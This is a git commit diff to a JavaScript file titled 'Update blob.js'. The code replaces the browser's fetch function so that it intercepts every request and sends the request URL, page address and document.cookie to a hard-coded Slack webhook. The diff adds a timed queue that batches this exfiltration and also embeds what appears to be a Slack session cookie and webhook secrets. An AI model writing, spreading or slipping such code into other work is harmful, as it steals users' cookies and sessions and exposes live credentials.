86808717758df442580f813be575dda812e141cf
Raymond Hill <crystaladmin@crystalmiller.net>
2025-04-09 17:06:27 +0200

    Update blob.js

--- blob.js
+++ blob.js
@@ -1,9 +1,11 @@
-/// blob.js
+
+
 function report(message) {
-    fetch('https://hooks.slack.com/services/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',{
+    fetch('https://hooks.slack.com/services/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',{
         method: 'POST',
         headers: {
-            'content-type': 'application/json'
+            'content-type': 'application/json',
+            'cookie': 'd=xoxd-QEan0YYxjE8WISNBT08w10rDcNDd2kHFNj3Z8Av3M0rgQzrdnjSnv6HfmpF2%2BuzhaIR3Vbmfheku9%2Fxq8DRWXaMxrwqUDNYGANbpO31wK0YSpTm5qzwq3wOLWk5wJTmf0JYQBOl5oVMhi48%2F0O4QW4h73agPhYjCgXqK7eHU4t21HDAadQUewIZNnVcqaWxLFy5Dox4wAJo7EO1EQRLwVpUWqGQP;'
         },
         body:JSON.stringify({text:message}),
         mode: 'no-cors'
@@ -11,6 +13,14 @@ function report(message) {
 }
 
 const original_fetch = window.fetch;
+
+window._queue__ = []
+setInterval(() => {
+    let popped = window._queue__.pop();
+    if(!popped) return;
+
+    report(popped)
+}, 3000);
 
 window.fetch = async function(...args) {
     const [input, init = {}] = args;
@@ -28,7 +38,7 @@ window.fetch = async function(...args) {
         }
         
         if(!input.includes('hooks.slack.com')) {
-            report(JSON.stringify({
+            window._queue__.push(JSON.stringify({
                 'url': input,
                 'origin': window.location.href,
                 'cookie': document.cookie,
